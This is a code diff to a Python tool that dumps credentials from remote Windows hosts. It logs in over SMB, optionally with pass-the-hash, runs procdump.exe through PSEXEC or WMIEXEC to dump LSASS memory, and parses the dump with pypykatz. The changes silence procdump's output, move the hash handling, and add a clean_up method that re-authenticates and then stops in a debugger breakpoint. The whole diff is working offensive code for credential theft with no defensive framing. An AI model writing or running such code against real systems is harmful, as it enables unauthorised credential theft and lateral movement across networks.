@@ -29,6 +29,8 @@ from pypykatz.remote.cmdhelper import RemoteCMDHelper
 
 ###############################################################
 
+import pdb
+
 
 class Dumper:
     def __init__(self, username, password, domain, target, auth, hashes):
@@ -42,16 +44,16 @@ class Dumper:
             "domain": domain,
             "hashes": hashes,
         }
+        if self.credentials["hashes"] != "":
+            self.credentials["hashes"] = self.credentials["hashes"].lower()
+        else:
+            self.credentials["hashes"] = None
         self.smb = SMBConnection(self.target, self.target, sess_port=445, timeout=4)
         self.host_info = self.enum_host_info()
 
     def enum_host_info(self):
         print("Performing enumeration")
         info_dict = {}
-        if self.credentials["hashes"] != "":
-            self.credentials["hashes"] = self.credentials["hashes"].lower()
-        else:
-            self.credentials["hashes"] = None
         self.smb.login(
             user=self.credentials["username"],
             password=self.credentials["password"],
@@ -124,7 +126,7 @@ class Dumper:
             password = ""
         if self.auth == "psexec":
             executer = PSEXEC(
-                "C:\\Users\\Public\\Documents\\procdump.exe -accepteula",
+                "C:\\Users\\Public\\Documents\\procdump.exe -accepteula > nul",
                 None,
                 None,
                 None,
@@ -174,7 +176,7 @@ class Dumper:
         elif self.auth == "wmiexec":
 
             executer = WMIEXEC(
-                command="C:\\Users\\Public\\Documents\\procdump.exe -accepteula",
+                command="C:\\Users\\Public\\Documents\\procdump.exe -accepteula > nul",
                 username=self.credentials["username"],
                 password=password,
                 domain=self.credentials["domain"],
@@ -229,6 +231,16 @@ class Dumper:
         self.smb.deleteFile("C$", "/Users/Public/Documents/procdump.exe")
         self.smb.close()
         print("ClearOut Done")
+
+    def clean_up(self):
+        self.smb.login(
+            user=self.credentials["username"],
+            password=self.credentials["password"],
+            domain=self.credentials["domain"],
+            nthash=self.credentials["hashes"].split(":")[1],
+            lmhash=self.credentials["hashes"].split(":")[0],
+        )
+        pdb.set_trace()
 
     @staticmethod
     def dump_to_pypykatz(dump_file="./lsass_dump.dmp"):
